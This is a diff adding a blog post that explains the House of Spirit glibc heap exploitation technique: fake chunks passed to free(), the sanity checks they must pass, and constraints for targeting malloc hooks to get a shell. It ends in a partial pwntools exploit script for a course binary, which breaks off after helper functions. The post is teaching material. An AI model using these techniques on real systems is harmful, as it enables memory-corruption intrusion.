@@ -1,0 +1,807 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="The House of Spirit is a heap exploitation technique that leverages the way memory allocation and deallocation work in some implementations. The House of Spirit exploit involves manipulating pointers that reference memory chunks on the heap. It achieves this by creating two specially crafted \" fake chunks\" in the heap."><title>The House of Spirit</title>
+<link rel=canonical href=https://demo.stack.jimmycai.com/p/the-house-of-spirit/><link rel=stylesheet href=/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css><meta property='og:title' content="The House of Spirit"><meta property='og:description' content="The House of Spirit is a heap exploitation technique that leverages the way memory allocation and deallocation work in some implementations. The House of Spirit exploit involves manipulating pointers that reference memory chunks on the heap. It achieves this by creating two specially crafted \" fake chunks\" in the heap."><meta property='og:url' content='https://demo.stack.jimmycai.com/p/the-house-of-spirit/'><meta property='og:site_name' content="Blog's Broder"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='pwnable'><meta property='article:published_time' content='2024-06-15T00:00:00+00:00'><meta property='article:modified_time' content='2024-06-15T00:00:00+00:00'><meta property='og:image' content='https://demo.stack.jimmycai.com/p/the-house-of-spirit/cover.jpg'><meta name=twitter:title content="The House of Spirit"><meta name=twitter:description content="The House of Spirit is a heap exploitation technique that leverages the way memory allocation and deallocation work in some implementations. The House of Spirit exploit involves manipulating pointers that reference memory chunks on the heap. It achieves this by creating two specially crafted \" fake chunks\" in the heap."><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://demo.stack.jimmycai.com/p/the-house-of-spirit/cover.jpg'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu52d511cf9903ea4ad70f535dcc239819_494186_300x0_resize_box_3.png width=300 height=298 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>❟❛❟</span></figure><div class=site-meta><h1 class=site-name><a href=/>Blog's Broder</a></h1><h2 class=site-description>“Sometimes You Must Hurt In Order To Know, Fall In Order To Grow, Lose In Order To Gain, Because Life’s Greatest Lessons Are Learned Through Pain.” - Pain</h2></div></header><ol class=menu-social><li><a href=https://github.com/BabyBroder target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://x.com/broder5631 target=_blank title=Twitter rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/about-me/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>About me</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#overall>Overall</a></li><li><a href=#approach>Approach</a></li><li><a href=#further-use>Further use</a></li><li><a href=#limitations>Limitations</a></li><li><a href=#sanity-checks>Sanity checks</a></li><li><a href=#note>Note</a></li><li><a href=#drop-a-shell>Drop a shell</a></li><li><a href=#script>Script</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/the-house-of-spirit/><img src=/p/the-house-of-spirit/cover_hua4516f7622f942ea94cadaa72a82b7db_84930_800x0_resize_q75_box.jpg srcset="/p/the-house-of-spirit/cover_hua4516f7622f942ea94cadaa72a82b7db_84930_800x0_resize_q75_box.jpg 800w, /p/the-house-of-spirit/cover_hua4516f7622f942ea94cadaa72a82b7db_84930_1600x0_resize_q75_box.jpg 1600w" width=800 height=533 loading=lazy alt="Featured image of post The House of Spirit"></a></div><div class=article-details><header class=article-category><a href=/categories/heap/>Heap
+</a><a href=/categories/exploit/>Exploit
+</a><a href=/categories/ctf/>CTF
+</a><a href=/categories/linux-heap-exploitation---part-2/>Linux Heap Exploitation - Part 2</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/the-house-of-spirit/>The House of Spirit</a></h2><h3 class=article-subtitle>The House of Spirit is a heap exploitation technique that leverages the way memory allocation and deallocation work in some implementations. The House of Spirit exploit involves manipulating pointers that reference memory chunks on the heap. It achieves this by creating two specially crafted "fake chunks" in the heap.</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Jun 15, 2024</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>14 minute read</time></div></footer></div></header><section class=article-content><h2 id=overall>Overall</h2><p><img src=https://hackmd.io/_uploads/HkVo99OS0.png loading=lazy alt=image></p><ul><li><p>The House of Spirit is the only technique that <em><strong>does not rely on one of the conventional heap-related bugs</strong></em>, instead it takes advantage of a scenario that allows a designer to <em><strong>corrupt a pointer that is subsequently passed to free()</strong></em>.</p></li><li><p>By passing a <em><strong>pointer to a fake chunk to free()</strong></em>, the <em><strong>fake chunk can be allocated and used to overwrite sensitive data</strong></em>.</p><ul><li>The fake chunk must have an <em><strong>appropriate size field</strong></em> and in the case of a <strong>FAST CHUNK</strong>, must have a <em><strong>succeeding size field that satisfies size sanity checks</strong></em>, meaning that a designer <em><strong>must control at least 2 quadwords that straddle the target data.</strong></em></li></ul></li><li><p>In the case of a small chunk, there must be 2 trailing size fields to ensure forward consolidation is not attempted, fencepost chunks will work. Because of this a designer must control at least 3 quadwords that straddle the target data.</p></li></ul><h2 id=approach>Approach</h2><ul><li>Pass an arbitrary pointer to the <em><strong>free()</strong></em> function, <em><strong>linking a fake chunk into a bin which can be allocated later</strong></em>.</li></ul><h2 id=further-use>Further use</h2><p>When <em><strong>combined with a heap leak</strong></em>, the House of Spirit can be used to <em><strong>coerce a double-free which can provide a more powerful primitive.</strong></em></p><h2 id=limitations>Limitations</h2><ul><li>If an arena’s contiguity flag is set, fake small chunks must reside at a lower address than their thread’s heap, this does not apply to fake fast chunks. Fake chunks must pass an alignment check, which not only ensures that they are 16-byte aligned but mitigates the presence of a set 4th-leastsignificant bit in the size field.</li><li>Fake chunks must avoid having set NON_MAIN_ARENA and IS_MMAPED bits, in the former case the free() function will search for a non-existent arena and will most likely segfault whilst doing so, and in the latter case the fake chunk is unmapped rather than freed.</li></ul><h2 id=sanity-checks>Sanity checks</h2><p><strong>Size field</strong>: IS_MMMAPED, NON_MAIN_ARENA and fourth-least significant bit must be clear.</p><ul><li><p><strong>IS_MMAPED</strong></p><ul><li>When <em><strong>malloc receives a request larger than a variable named &ldquo;mmap_threshold&rdquo;</strong></em>, the request will be serviced via the GLIBC mmap() function rather than from an arena. More deatail about mmap can be search from its manpage and you can find the &ldquo;mmap_threshold&rdquo; variable amongst the malloc parameters, which can be dumped with pwndbg <code>mp</code> command</li><li>When a chunk is allocated via mmap, its IS_MMAPPED flag is set. <em><strong>When the free() function operates on a chunk with a set IS_MMAPPED flag,instead of linking it back into an arena, it will unmap the chunk with GLIBC&rsquo;s munmap() function.</strong></em></li></ul></li><li><p><strong>NON_MAIN_ARENA</strong></p><ul><li>There are <strong>two types of arenas</strong>, the <em>main arena</em>, which resides in GLIBC&rsquo;s data section and <em>non-main arenas</em>, which can be created by malloc in multithreaded applications.</li><li>Because <em><strong>non-main arenas are created dynamically at runtime</strong></em>, <strong>malloc can&rsquo;t resolve them using symbols</strong>. Instead, it gives new arenas and their corresponding heaps something called a &ldquo;heap_info&rdquo; struct and ensures they&rsquo;re mapped at a specific alignment. <em><strong>Malloc can then locate non-main arenas by applying an and-mask to a chunk&rsquo;s address to find its corresponding heap_info struct.</strong></em> To determine which arena a chunk should be linked into, the free() function checks its NON_MAIN_ARENA flag.</li><li>When free() comes across a set NON_MAIN_ARENA flag, <em><strong>rather than linking the chunk into the main arena, it will instead apply that and-mask to the chunk&rsquo;s address</strong></em>, <em><strong>in effect rounding it down to a much lower value in an attempt to locate that chunk&rsquo;s arena</strong></em>. Of course, our fake chunk doesn&rsquo;t belong to an arena, and therefore, when we try to free it, <em><strong>malloc rounds its address down to an unmapped address and subsequently segfaults</strong></em>. Under some circumstances, you could use the NON_MAIN_ARENA flag to orchestrate mayhem by providing a fake arena.</li></ul></li></ul><p><em><strong>malloc&rsquo;s size sanity checks</strong></em>: instead of operating on the chunk being freed, it&rsquo;s testing the succeeding chunk.</p><ul><li>If that chunk is <strong>smaller than a fencepost chunk or larger than av->system_mem</strong>, the mitigation is triggered.</li></ul><p><strong>Constraints for chunk with size larger than fastbin size:</strong> &ldquo;normal&rdquo; chunk size range, making it eligible for unsortedbin insertion on free.</p><ul><li><strong>prev_inuse bit must to be set</strong>: clear prev_inuse flag on a non-fast chunk will cause malloc to consolidate it with the previous chunk.</li><li><em><strong>prev_inuse bit of size field of the succeeding chunk must be set.</strong></em> If that flag is clear, that chunk we&rsquo;re trying to free must already be free.</li><li>The Unsafe Unlink technique taught us that malloc will also check the prev_inuse flag of the chunk after the succeeding chunk. If that&rsquo;s clear, then it will attempt forward consolidation. The easiest way to avoid this is to provide a third fake size field using fencepost chunks(0x11).</li><li>The version of GLIBC this binary is linked against, 2.30, also performs the same next size sanity check during unsortedbin scanning.</li></ul><h2 id=note>Note</h2><ul><li><p>These course binaries keep track of their allocated chunks using an array named &ldquo;m_array&rdquo; and the house_of_spirit program keeps its m_array on the stack.</p></li><li><p>This binary has an overflow bug which allowed us to overwrite a pointer that was subsequently passed to the free() function. The overflow bug manifests on the stack, but it could have occurred anywhere. We used this bug to replace a pointer with the address of a fake chunk we&rsquo;d prepared overlapping ourtarget data.</p></li><li><p>Using a fake normal chunk in the House of Spirit has the same constraints as using a fast chunk, plus we need to control or find a third quadword with a set least-significant bit.</p></li><li><p>The advantages of using a normal chunk are that it can take on a wider range of sizes and we can remainder it, meaning that we don&rsquo;t have to request the exact size of our fake chunk to allocate from it.</p></li><li><p>There is one disadvantage to using normal chunks in the House of Spirit</p><ul><li>Checking whether the next chunk is beyond the boundaries of the arena, this check is only applied to normal chunks during the free process, fast chunks are exempt.</li><li>Our fake normal chunk, along with its succeeding chunk, are nowhere near the boundaries of the heap, but it&rsquo;s only checking whether the next chunk is at an address larger than or equal to that of the end of the top chunk.</li><li>This means that any address below that is fair game, including the writable segment of the program.</li></ul></li><li><p>So if you&rsquo;re using fake fast chunks in the House of Spirit, they can be located anywhere you like, but when using fake normal chunks you&rsquo;re limited to addresses below the end of the main arena&rsquo;s heap. The exception to this rule is if the main arena has become non-contiguous under memory pressure.</p></li></ul><h2 id=drop-a-shell>Drop a shell</h2><p><em><strong>It requires more contrains</strong></em></p><ul><li>The first approach that comes to mind is why not just free that 0x7f chunk that we used for our fastbin dup the one that sits just before the malloc hook and is consistently formed by one of the standard IO vtable pointers and following padding quadword.<ul><li>That won&rsquo;t work because a 0x7f size field has three set bits that will cause our House of Spirit primitive to fail, namely the IS_MMAPPED bit, the NON_MAIN_ARENA bit and the fourth-least significant bit.</li></ul></li><li>However, it triggered a mitigation before the one that checks the freed chunk&rsquo;s size field. This mitigation is checking two things;<ul><li>The first is whether the freed chunk wraps around the VA space House of Force style.</li><li>The second is whether the chunk is 16 byte aligned, due to the nature of how heaps are mapped and the fact that chunk sizes are always multiples of 16 bytes on this architecture, legitimate chunks should never be misaligned.</li></ul></li></ul><p><em><strong>Constraints</strong></em></p><ul><li>I target to one of malloc&rsquo;s hooks, our fake junk must be in the fastbin range because <em><strong>normal chunks can&rsquo;t be freed at addresses above the default heap</strong></em>.</li><li>The second, third and fourth least significant bits of our fake chunks size field must be clear.</li><li>Our fake chunk must be 16 byte aligned.</li><li>I need to provide a succeeding size field of appropriate value at the right location.</li></ul><h2 id=script>Script</h2><p>overwrite.py</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./house_of_spirit&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;../.glibc/glibc_2.30_no-tcache/libc.so.6&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>ld</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;../.glibc/glibc_2.30_no-tcache/libc.so.6&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>b *main
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+270
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+327
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+415
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+541
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+652
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+707
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+792
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+873
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info</span><span class=p>(</span><span class=n>mes</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>mes</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>handle</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>puts</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>heap</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;puts() @ &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>puts</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;heap @ &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>heap</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s1>&#39;puts @ &#39;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>puts</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;heap @ &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>heap</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>puts</span><span class=p>,</span> <span class=n>heap</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info_user</span><span class=p>(</span><span class=n>age</span><span class=p>,</span> <span class=n>name</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Enter your age: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>age</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Enter your username: &#39;</span><span class=p>,</span> <span class=n>name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=n>chunk_name</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>index</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;size: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;data: &#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;chunk name: &#39;</span><span class=p>,</span> <span class=n>chunk_name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>index</span> <span class=o>-</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#io.recvuntil(b&#39;&gt; &#39;)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>target</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>quit</span><span class=p>():</span>
